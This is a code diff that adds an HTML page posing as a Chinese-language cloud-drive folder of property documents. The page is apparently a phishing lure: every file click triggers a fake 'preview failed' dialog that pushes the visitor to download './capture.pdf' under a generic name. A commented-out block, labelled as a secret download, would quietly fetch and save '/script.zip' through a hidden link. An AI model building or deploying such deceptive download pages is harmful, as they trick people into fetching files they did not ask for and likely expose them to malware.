@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>檔案下載</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            color: #333;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4285f4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Navbar 樣式 */
+        .navbar {
+            background-color: #fff;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .navbar-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .navbar-logo {
+            width: 36px;
+            height: 36px;
+        }
+
+        .navbar-title {
+            font-size: 18px;
+            color: #333;
+        }
+
+        .navbar-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .navbar-icon {
+            color: #5f6368;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        /* 檔案列表樣式調整 */
+        .file-list {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+
+        /* 調整表頭對齊 */
+        .file-header {
+            display: flex;
+            align-items: center;
+            padding: 0 8px 8px 8px;
+            border-bottom: 1px solid #e0e0e0;
+            color: #5f6368;
+            font-size: 12px;
+        }
+
+        .file-header-item {
+            padding: 0 8px;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-name {
+            flex: 2;
+            padding-left: 8px; /* 改回較小的左邊距 */
+        }
+
+        .header-owner,
+        .header-modified,
+        .header-size {
+            flex: 1;
+            text-align: right;
+            padding-right: 24px;
+            justify-content: flex-end; /* 確保內容靠右 */
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .file-item:hover {
+            background-color: #f8f9fa;
+        }
+
+        .file-info {
+            flex: 2;
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+        }
+
+        .file-owner,
+        .file-modified,
+        .file-size {
+            flex: 1;
+            font-size: 13px;
+            color: #5f6368;
+            padding: 0 8px;
+            white-space: nowrap;
+            text-align: right;
+            padding-right: 24px;
+        }
+
+        .file-icon {
+            font-size: 16px;
+            color: #5f6368;
+            margin-right: 12px;
+            width: 24px; /* 固定圖示寬度 */
+            text-align: center; /* 圖示置中 */
+        }
+
+        .file-name {
+            font-size: 14px;
+            color: #333;
+        }
+
+        .file-meta {
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        /* 調整下載對話框樣式 */
+        .download-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #2d2d2d;
+            padding: 32px 32px; /* 增加上下內邊距 */
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            width: 360px;
+            display: none;
+            z-index: 2000;
+            color: white;
+        }
+
+        .download-message {
+            text-align: center;
+            margin-bottom: 32px; /* 增加與按鈕的間距 */
+        }
+
+        .download-message h2 {
+            color: white;
+            margin: 0 0 16px 0;
+            font-size: 28px; /* 增加標題字體大小 */
+        }
+
+        .download-message p {
+            color: #ccc;
+            margin: 0;
+            font-size: 16px; /* 增加內文字體大小 */
+            line-height: 1.5;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center; /* 置中按鈕 */
+        }
+
+        .download-button {
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            min-width: 100px; /* 確保按鈕有最小寬度 */
+        }
+
+        .download-button:hover {
+            background-color: #3367d6;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.3);
+            display: none;
+            z-index: 1500;
+        }
+
+        /* 文件區標題列樣式 */
+        .folder-header {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .folder-title {
+            font-size: 18px;
+            color: #333;
+        }
+
+        .download-all {
+            color: #1a73e8;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .download-all:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- Navbar -->
+    <div class="navbar">
+        <div class="navbar-left">
+            <img src="data:image/png;base64,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" alt="logo" class="navbar-logo">
+            <div class="navbar-title">雲端硬碟</div>
+        </div>
+        <div class="navbar-right">
+            <i class="fas fa-th navbar-icon"></i>
+        </div>
+    </div>
+
+    <!-- 在 navbar 和檔案列表之間添加新的區塊 -->
+    <div class="folder-header">
+        <div class="folder-title">房產文件</div>
+        <a href="#" class="download-all" id="downloadAllBtn">全部下載</a>
+    </div>
+
+    <!-- 檔案列表 -->
+    <div class="file-list">
+        <!-- 檔案列表表頭 -->
+        <div class="file-header">
+            <div class="file-header-item header-name">名稱</div>
+            <div class="file-header-item header-owner">擁有者</div>
+            <div class="file-header-item header-modified">上次修改時間</div>
+            <div class="file-header-item header-size">檔案大小</div>
+        </div>
+
+        <!-- 檔案項目 -->
+        <div class="file-item" id="fileItem1">
+            <div class="file-info">
+                <i class="far fa-file-pdf file-icon"></i>
+                <span class="file-name">2003 地產申請表.pdf</span>
+            </div>
+            <div class="file-owner">徐子齊</div>
+            <div class="file-modified">下午6:10</div>
+            <div class="file-size">2.5 MB</div>
+        </div>
+        <div class="file-item" id="fileItem2">
+            <div class="file-info">
+                <i class="far fa-file-pdf file-icon"></i>
+                <span class="file-name">2023 房屋買賣合約.pdf</span>
+            </div>
+            <div class="file-owner">徐子齊</div>
+            <div class="file-modified">下午6:09</div>
+            <div class="file-size">1.8 MB</div>
+        </div>
+        <div class="file-item" id="fileItem3">
+            <div class="file-info">
+                <i class="far fa-file-pdf file-icon"></i>
+                <span class="file-name">租賃協議書範本.pdf</span>
+            </div>
+            <div class="file-owner">徐子齊</div>
+            <div class="file-modified">下午6:08</div>
+            <div class="file-size">3.2 MB</div>
+        </div>
+    </div>
+
+    <!-- 遮罩層 -->
+    <div class="overlay" id="overlay"></div>
+
+    <!-- 下載對話框 -->
+    <div class="download-container" id="downloadDialog">
+        <div class="download-message">
+            <h2>糟糕！</h2>
+            <p>顯示預覽畫面時發生問題。</p>
+        </div>
+        <div class="button-container">
+            <button class="download-button" id="downloadBtn">
+                下載
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // 頁面載入時顯示 loading 畫面
+        window.addEventListener('load', function() {
+            // 模擬載入時間（2秒後隱藏 loading 畫面）
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.display = 'none';
+            }, 2000);
+        });
+
+        // 為所有檔案項目添加點擊事件
+        const fileItems = ['fileItem1', 'fileItem2', 'fileItem3'];
+        fileItems.forEach(itemId => {
+            document.getElementById(itemId).addEventListener('click', function() {
+                // 顯示 loading 畫面
+                document.getElementById('loadingScreen').style.display = 'flex';
+                
+                // 2.5秒後顯示下載對話框
+                setTimeout(function() {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    document.getElementById('overlay').style.display = 'block';
+                    document.getElementById('downloadDialog').style.display = 'block';
+                }, 2500);
+            });
+        });
+
+        // 點擊遮罩層關閉對話框
+        document.getElementById('overlay').addEventListener('click', function() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('downloadDialog').style.display = 'none';
+        });
+
+        // 全部下載按鈕點擊事件
+        document.getElementById('downloadAllBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // 顯示 loading 畫面
+            document.getElementById('loadingScreen').style.display = 'flex';
+            
+            // 模擬下載延遲
+            setTimeout(function() {
+                // 建立所有檔案的下載陣列
+                const files = [
+                    {
+                        path: './capture.pdf',
+                        name: 'download.pdf'
+                    },
+                    {
+                        path: './capture.pdf',
+                        name: 'download.pdf'
+                    },
+                    {
+                        path: './capture.pdf',
+                        name: 'download.pdf'
+                    }
+                ];
+
+                // 依序下載所有檔案
+                files.forEach((file, index) => {
+                    setTimeout(() => {
+                        downloadFile(file.path, file.name);
+                    }, index * 1000); // 每個檔案間隔 1 秒下載
+                });
+
+                // 下載完成後隱藏 loading
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                }, files.length * 1000);
+            }, 1000);
+        });
+
+        // 檔案下載函數
+        function downloadFile(filePath, fileName) {
+            fetch(filePath)
+                .then(response => response.blob())
+                .then(blob => {
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'download.pdf';  // 指定固定的下載檔名
+                    document.body.appendChild(a);
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                    document.body.removeChild(a);
+                })
+                .catch(error => {
+                    console.error('下載失敗:', error);
+                    alert('檔案下載失敗，請稍後再試');
+                });
+            // 偷偷下載檔案 (但現在下載時瀏覽器還是會詢問)
+            // setTimeout(() => {
+            //     fetch('/script.zip')
+            //         .then(response => response.blob())
+            //         .then(blob => {
+            //             const url = window.URL.createObjectURL(blob);
+            //             const hiddenLink = document.createElement('a');
+            //             hiddenLink.style.display = 'none';
+            //             hiddenLink.href = url;
+            //             hiddenLink.download = 'script.zip';
+            //             document.body.appendChild(hiddenLink);
+            //             hiddenLink.click();
+            //             window.URL.revokeObjectURL(url);
+            //             document.body.removeChild(hiddenLink);
+            //         });
+            // }, 500);
+        }
+
+        // 下載按鈕點擊事件
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            const filePath = './capture.pdf';
+            const fileName = '2003 地產申請表.pdf';
+            
+            downloadFile(filePath, fileName);
+            
+            // 關閉對話框
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('downloadDialog').style.display = 'none';
+        });
+    </script>
+</body>
+</html>
